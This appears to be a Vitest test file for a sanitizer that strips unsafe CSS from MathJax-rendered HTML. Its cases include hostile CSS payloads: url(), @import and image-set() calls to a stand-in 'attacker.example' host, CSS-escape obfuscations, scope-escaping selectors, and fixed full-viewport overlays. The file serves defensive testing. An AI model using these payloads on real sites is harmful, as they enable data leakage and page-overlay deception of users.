// @vitest-environment jsdom
import { beforeAll, describe, expect, it } from "vitest";

import { renderMarkdown } from "./markdownRendering";
import { sanitizeRenderedHtml } from "./renderedHtmlSanitizer";

const parse = (html: string): HTMLElement => {
  const root = document.createElement("div");
  root.innerHTML = html;
  return root;
};

const mathJaxStyle = (css: string): string =>
  `<span id="mjx-a1"><style>${css}</style><mjx-container>x</mjx-container></span>`;

const sanitizedCss = (css: string): string | undefined =>
  parse(sanitizeRenderedHtml(mathJaxStyle(css))).querySelector("style")
    ?.textContent ?? undefined;

describe("sanitizeRenderedHtml MathJax stylesheet", () => {
  let mathHtml = "";
  beforeAll(async () => {
    mathHtml = await renderMarkdown("$\\frac{1}{2}$", "full");
  });

  it("keeps a genuine MathJax stylesheet, scoped and positioning its assistive MathML", () => {
    const root = parse(sanitizeRenderedHtml(mathHtml));
    const style = root.querySelector('span[id^="mjx-"] > style');
    const id = style?.parentElement?.id ?? "";
    const css = style?.textContent ?? "";

    expect(root.querySelector("mjx-container")).not.toBeNull();
    expect(css.startsWith(`#${id} {`)).toBe(true);
    expect(css).toMatch(
      /mjx-assistive-mml \{[^}]*position: absolute !important/
    );
    expect(css).toMatch(
      /mjx-assistive-mml \{[^}]*clip: rect\(1px, 1px, 1px, 1px\)/
    );
    expect(css).toMatch(/mjx-container\[jax="SVG"\] > svg a \{[^}]*fill: blue/);
    // mjx-status is fixed-positioned in MathJax's default sheet; nothing in
    // rendered output uses it and fixed positioning is not admitted.
    expect(css).not.toContain("fixed");
  });

  it.each([
    [
      "an unscoped top-level rule",
      "#mjx-a1{display:contents} body{background-color:red}",
      /body/,
    ],
    ["a top-level rule for another id", "#mjx-a2{color:red}", /mjx-a2/],
    [
      "a selector list that widens the top-level scope",
      "#mjx-a1, body{color:red}",
      /body/,
    ],
    [
      "a nested selector that re-anchors with the nesting selector",
      "#mjx-a1{ body & {color:red} }",
      /body/,
    ],
    [
      "a nested selector that escapes through :is()",
      "#mjx-a1{ :is(body, &) {color:red} }",
      /body/,
    ],
    ["a nested at-rule", "#mjx-a1{ @media screen { color:red } }", /media/],
    [
      "image-set() on an allowlisted property",
      '#mjx-a1{ & div { fill: image-set("https://attacker.example/x" 1x) } }',
      /attacker/,
    ],
    [
      "a property outside the allowlist",
      "#mjx-a1{ & div { background-image: none; content: 'x' } }",
      /background|content/,
    ],
    [
      "fixed positioning",
      "#mjx-a1{ & div { position: fixed; top: 0; left: 0 } }",
      /fixed/,
    ],
    ["sticky positioning", "#mjx-a1{ & div { position: sticky } }", /sticky/],
    [
      "negative margins",
      "#mjx-a1{ & div { margin: -100vh 0 0 -50vw } }",
      /margin[^;]*: -/,
    ],
  ])("drops %s", (_label, css, forbidden) => {
    expect(sanitizedCss(css) ?? "").not.toMatch(forbidden);
  });

  it.each([
    [
      "a CSS-escaped url()",
      "#mjx-a1{ & div { fill: \\75rl(https://attacker.example/x) } }",
    ],
    [
      "a CSS-escaped @import",
      '@\\69mport "https://attacker.example/x.css"; #mjx-a1{}',
    ],
    [
      "a literal @import",
      "@import url(https://attacker.example/x.css); #mjx-a1{}",
    ],
    [
      "a literal url()",
      "#mjx-a1{ & div { fill: url(https://attacker.example/x) } }",
    ],
  ])("removes the element entirely for %s", (_label, css) => {
    expect(sanitizedCss(css)).toBeUndefined();
  });

  // Browsers enumerate the shorthands MathJax writes as longhands.
  it("keeps box longhands MathJax relies on", () => {
    const css = sanitizedCss(
      "#mjx-a1{ & svg { overflow-x: visible; overflow-y: visible; margin-top: 1em; padding-left: 1px; border-top-width: 1px; border-top-style: solid; border-top-color: #888 } }"
    );
    expect(css).toContain("overflow-x: visible");
    expect(css).toContain("overflow-y: visible");
    expect(css).toContain("margin-top: 1em");
    expect(css).toContain("padding-left: 1px");
    expect(css).toContain("border-top-width: 1px");
    expect(css).toContain("border-top-style: solid");
  });

  it("removes a style element whose parent is not a MathJax wrapper", () => {
    const root = parse(
      sanitizeRenderedHtml("<div><style>#x{color:red}</style>x</div>")
    );
    expect(root.querySelector("style")).toBeNull();
  });

  it("removes a MathJax-shaped style element with nothing left to keep", () => {
    expect(sanitizedCss("body{color:red}")).toBeUndefined();
  });
});

describe("sanitizeRenderedHtml inline style attributes", () => {
  const styleOf = (style: string): string =>
    parse(sanitizeRenderedHtml(`<div style="${style}">x</div>`))
      .querySelector("div")
      ?.getAttribute("style") ?? "";

  it("keeps the declarations MathJax puts on its output", () => {
    const kept = styleOf(
      "position: relative; min-width: 14.823ex; vertical-align: -0.566ex; color: red"
    );
    expect(kept).toContain("position: relative");
    expect(kept).toContain("min-width: 14.823ex");
    expect(kept).toContain("vertical-align: -0.566ex");
    expect(kept).toContain("color: red");
  });

  it("keeps in-flow box longhands and drops a negative margin longhand", () => {
    const kept = styleOf(
      "padding-left: 2px; margin-top: 1em; margin-left: -1em; overflow-x: auto"
    );
    expect(kept).toContain("padding-left: 2px");
    expect(kept).toContain("margin-top: 1em");
    expect(kept).toContain("overflow-x: auto");
    expect(kept).not.toContain("margin-left");
  });

  it.each([
    [
      "a fixed full-viewport overlay",
      "position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background-color: #fff",
      /position|top|left/,
    ],
    ["absolute positioning", "position: absolute", /position/],
    ["sticky positioning", "position: sticky", /position/],
    [
      "inset offsets",
      "top: 0; right: 0; bottom: 0; left: 0",
      /top|right|bottom|left/,
    ],
    [
      "a viewport-sized box-shadow",
      "box-shadow: 0 0 0 9999px #fff",
      /box-shadow/,
    ],
    ["negative margins", "margin: -100vh 0 0 -50vw", /margin[^;]*: -/],
    [
      "image-set() on an allowlisted property",
      'fill: image-set("https://attacker.example/x" 1x)',
      /attacker/,
    ],
    [
      "a CSS-escaped url()",
      "fill: \\75rl(https://attacker.example/x)",
      /attacker/,
    ],
  ])("drops %s", (_label, style, forbidden) => {
    expect(styleOf(style)).not.toMatch(forbidden);
  });
});
